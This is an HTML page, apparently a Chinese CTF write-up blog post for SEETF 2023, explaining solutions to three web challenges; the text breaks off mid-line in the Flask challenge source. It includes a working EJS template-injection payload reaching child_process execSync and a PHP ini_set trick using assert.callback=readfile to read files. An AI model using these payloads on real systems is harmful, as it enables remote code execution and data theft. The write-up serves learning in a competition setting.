@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free@6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://unpkg.com/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"gudiffany.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="2023SEETF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023SEETF">
+<meta property="og:url" content="https://gudiffany.github.io/2023/08/18/13-21-58/index.html">
+<meta property="og:site_name" content="diffany">
+<meta property="og:description" content="2023SEETF">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230818134152536.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230818134331920.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230818140144925.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230818141947687.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230818142052534.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230818140632625.png">
+<meta property="article:published_time" content="2023-08-18T05:21:58.000Z">
+<meta property="article:modified_time" content="2023-08-19T07:00:16.041Z">
+<meta property="article:author" content="diffany">
+<meta property="article:tag" content="2023ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gudiffany.github.io/img/image-20230818134152536.png">
+
+
+<link rel="canonical" href="https://gudiffany.github.io/2023/08/18/13-21-58/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://gudiffany.github.io/2023/08/18/13-21-58/","path":"2023/08/18/13-21-58/","title":"2023SEETF"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2023SEETF | diffany</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">diffany</p>
+      <i class="logo-line"></i>
+    </a>
+      <img class="custom-logo-image" src="/uploads/custom-logo.png" alt="diffany">
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-友情链接"><a href="/friend/" rel="section"><i class="fa fa-sitemap fa-fw"></i>友情链接</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">2023SEETF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Express-JavaScript-Security"><span class="nav-number">1.1.</span> <span class="nav-text">Express JavaScript Security</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Sourceful-Guessless-Web"><span class="nav-number">1.2.</span> <span class="nav-text">Sourceful Guessless Web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A6%8F"><span class="nav-number">1.3.</span> <span class="nav-text">福</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Throw-your-malware-here"><span class="nav-number">1.4.</span> <span class="nav-text">Throw your malware here!</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">diffany</p>
+  <div class="site-description" itemprop="description">一个努力学习的菜鸟</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://unpkg.com/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+        <div class="pjax">
+        </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://gudiffany.github.io/2023/08/18/13-21-58/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="diffany">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="diffany">
+      <meta itemprop="description" content="一个努力学习的菜鸟">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2023SEETF | diffany">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2023SEETF<a href="https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/_posts/2023SEETF.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pen-nib"></i></a>
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-08-18 13:21:58" itemprop="dateCreated datePublished" datetime="2023-08-18T13:21:58+08:00">2023-08-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-08-19 15:00:16" itemprop="dateModified" datetime="2023-08-19T15:00:16+08:00">2023-08-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/2023wp/" itemprop="url" rel="index"><span itemprop="name">2023wp</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/2023/08/18/13-21-58/" class="post-meta-item leancloud_visitors" data-flag-title="2023SEETF" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1>2023SEETF</h1>
+<span id="more"></span>
+<h2 id="Express-JavaScript-Security">Express JavaScript Security</h2>
+<p>这题算是我学会怎么去调试一个js后端的一个开始</p>
+<p>在vscode中的调试选项中新建一个node.js调试配置，并且更改配置如下</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node&quot;</span><span class="punctuation">,</span>   <span class="comment">//启动方式</span></span><br><span class="line">      <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Launch Program&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/main.js&quot;</span><span class="punctuation">,</span> <span class="comment">//入口文件</span></span><br><span class="line">      <span class="attr">&quot;skipFiles&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>  <span class="comment">//跳过文件</span></span><br><span class="line">        <span class="comment">// &quot;&lt;node_internals&gt;/**&quot;  </span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      </span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>记得把skipFiles注释掉就行了，然后就可以愉快的调试了</p>
+<p><img src="/img/image-20230818134152536.png" alt="image-20230818134152536" /></p>
+<p>在这里下一个断点，然后正常去访问页面，会调用render，将get的参数传入</p>
+<p><img src="/img/image-20230818134331920.png" alt="image-20230818134331920" /></p>
+<p>不断进行F11，下面在ejs.js进行了一些判断</p>
+<p><img src="/img/image-20230818140144925.png" alt="image-20230818140144925" /></p>
+<p><img src="/img/image-20230818141947687.png" alt="image-20230818141947687" /></p>
+<p><img src="/img/image-20230818142052534.png" alt="image-20230818142052534" /></p>
+<p>最后会生成一个文件</p>
+<p><img src="/img/image-20230818140632625.png" alt="image-20230818140632625" /></p>
+<p>简单来说，setting的参数会被赋值到options，然后通过改变setting的参数使得生成的模板可以执行代码，需要利用的就是</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">options.<span class="property">client</span> = opts.<span class="property">client</span> || <span class="literal">false</span>;</span><br><span class="line">options.<span class="property">escapeFunction</span> = opts.<span class="property">escape</span> || opts.<span class="property">escapeFunction</span> || utils.<span class="property">escapeXML</span>;</span><br></pre></td></tr></table></figure>
+<p>也就是说利用</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">viewOpts = data. settings[<span class="string">&#x27;view options&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (viewOpts) &#123;</span><br><span class="line">          utils.<span class="title function_">shallowCopy</span>(opts, viewOpts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这代码会将view options的键值对赋值给opts然后传递给options，之后对其中的值进行判断再还给opts然后对opts进行处理生成文件</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (opts.<span class="property">client</span>) &#123;</span><br><span class="line">      src = <span class="string">&#x27;escapeFn = escapeFn || &#x27;</span> + escapeFn.<span class="title function_">toString</span>() + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> + src;</span><br><span class="line">      <span class="keyword">if</span> (opts.<span class="property">compileDebug</span>) &#123;</span><br><span class="line">        src = <span class="string">&#x27;rethrow = rethrow || &#x27;</span> + rethrow.<span class="title function_">toString</span>() + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> + src;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>如果传入的client的值为真，会将escapeFn传入生成的模板中，然后在生成的模板文件中如果注入恶意代码就可以进行RCE了</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mde/ejs/issues/735">EJS@3.1.9 has a server-side template injection vulnerability (Unfixed) · Issue #735 · mde/ejs · GitHub</a></p>
+<p>然后使用escape绕过黑名单就可以了</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//127.0.0.1:3000/greet?name=q&amp;font=Arial&amp;fontSize=20&amp;settings[view options][client]=true&amp;settings[view options][escape]=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;);</span></span><br></pre></td></tr></table></figure>
+<h2 id="Sourceful-Guessless-Web">Sourceful Guessless Web</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line"><span class="variable">$flag</span> =  <span class="string">&quot;SEE&#123;FAKE_FLAG&#125;&quot;</span>; <span class="comment">// Oops, my dog ate my flag...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^SEE&#123;.*&#125;$/&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;config&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;config&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">ini_set</span>(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^SEE&#123;.*&#125;$/&quot;</span>, <span class="variable">$flag</span>), <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+<p>这里需要flag能够匹配SEE{}这样的形式，然后会触发assert断言</p>
+<p>那么对于preg_match可以通过设置pcre.backtrack_limit的回溯次数来进行绕过，如果设置为0，那么就说明不会进行匹配，将返回0，触发assert错误，那么对于assert相关设置<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/info.configuration.php#ini.assert.callback">PHP: 运行时配置 - Manual</a></p>
+<p>可以查看官方文档，</p>
+<p>通过设置<code>assert.callback</code> string</p>
+<p>断言失败后要调用的回调函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// This is our function to handle</span><br><span class="line">// assert failures</span><br><span class="line">function assert_failure($file, $line, $assertion, $message)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;The assertion $assertion in $file on line $line has failed: $message&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// This is our test function</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// Set our assert options</span><br><span class="line">assert_options(ASSERT_ACTIVE,   true);</span><br><span class="line">assert_options(ASSERT_BAIL,     true);</span><br><span class="line">assert_options(ASSERT_WARNING,  false);</span><br><span class="line">assert_options(ASSERT_CALLBACK, &#x27;assert_failure&#x27;);</span><br><span class="line"></span><br><span class="line">// Make an assert that would fail</span><br><span class="line">assert(0);</span><br><span class="line"></span><br><span class="line">// This is never reached due to ASSERT_BAIL</span><br><span class="line">// being true</span><br><span class="line">echo &#x27;Never reached&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>那么就可以构造出exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=SEE&#123;szdc&#125;&amp;debug=1&amp;config[pcre.backtrack_limit]=0&amp;config[assert.callback]=readfile</span><br></pre></td></tr></table></figure>
+<h2 id="福">福</h2>
+<p>参考：<a target="_blank" rel="noopener" href="https://github.com/Social-Engineering-Experts/SEETF-2023-Public/blob/2588dd0358cb83c8e7c6eb63743c2fe90e35a5b1/challs/web/%E7%A6%8F/README.md">https://github.com/Social-Engineering-Experts/SEETF-2023-Public/blob/2588dd0358cb83c8e7c6eb63743c2fe90e35a5b1/challs/web/福/README.md</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> waitress <span class="keyword">import</span> serve</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line">keys = []</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> flag:</span><br><span class="line">	contents = flag.read()</span><br><span class="line">	福 = contents.strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">a_value, b_value, c_value, d_value, f_value</span>):</span><br><span class="line">	<span class="comment"># Create the variables</span></span><br><span class="line">	a, b, c, d, e, f = Ints(<span class="string">&#x27;a b c d e f&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Set the relationships between the variables</span></span><br><span class="line">	constraints = [And(<span class="number">8</span> &lt;= v) <span class="keyword">for</span> v <span class="keyword">in</span> [a, b, c, d, e, f]]</span><br><span class="line">	constraints += [a == a_value] </span><br><span class="line">	constraints += [b == b_value]</span><br><span class="line">	constraints += [c == c_value]</span><br><span class="line">	constraints += [d == d_value]</span><br><span class="line">	constraints += [f == f_value]</span><br><span class="line">	constraints += [(a ** <span class="number">3</span>) * (b**<span class="number">2</span> + c**<span class="number">2</span>) * (<span class="number">2</span>*d + <span class="number">1</span>) == (e**<span class="number">3</span>) + (f**<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Find a satisfying solution</span></span><br><span class="line">	s = Solver()</span><br><span class="line">	s.add(constraints)</span><br><span class="line">	<span class="keyword">if</span> s.check() == sat:</span><br><span class="line">		m = s.model()</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">int</span>(m[e].as_long())</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_cookie</span>(<span class="params">signed_cookie</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		compressed = <span class="literal">False</span></span><br><span class="line">		<span class="keyword">if</span> signed_cookie.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">			compressed = <span class="literal">True</span></span><br><span class="line">			signed_cookie = signed_cookie[<span class="number">1</span>:]</span><br><span class="line">		data = signed_cookie.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">		data = base64_decode(data)</span><br><span class="line">		<span class="keyword">if</span> compressed:</span><br><span class="line">			data = zlib.decompress(data)</span><br><span class="line">		<span class="keyword">return</span> json.loads(data.decode())</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replace_secret_key</span>():</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;key&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;key&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> keys:</span><br><span class="line">		keys.append(session[<span class="string">&#x27;key&#x27;</span>])</span><br><span class="line">		app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = session[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;session&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> <span class="string">&#x27;end&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">		new_session = session[<span class="string">&#x27;session&#x27;</span>]</span><br><span class="line">		session.update(decrypt_cookie(new_session))</span><br><span class="line">		replace_secret_key()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">key</span>):</span><br><span class="line">	random.seed(key)</span><br><span class="line">	<span class="keyword">return</span> random.randint(<span class="number">8</span>, <span class="number">88888</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/福&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fortold</span>():</span><br><span class="line">	keys.clear()</span><br><span class="line">	start = request.form.get(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">	app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = start</span><br><span class="line">	replace_secret_key()</span><br><span class="line"></span><br><span class="line">	value = [secret(key) <span class="keyword">for</span> key <span class="keyword">in</span> keys]</span><br><span class="line">	result = solve(*value)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">eval</span>(<span class="built_in">chr</span>(result))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;Bad Luck.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	serve(app, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span 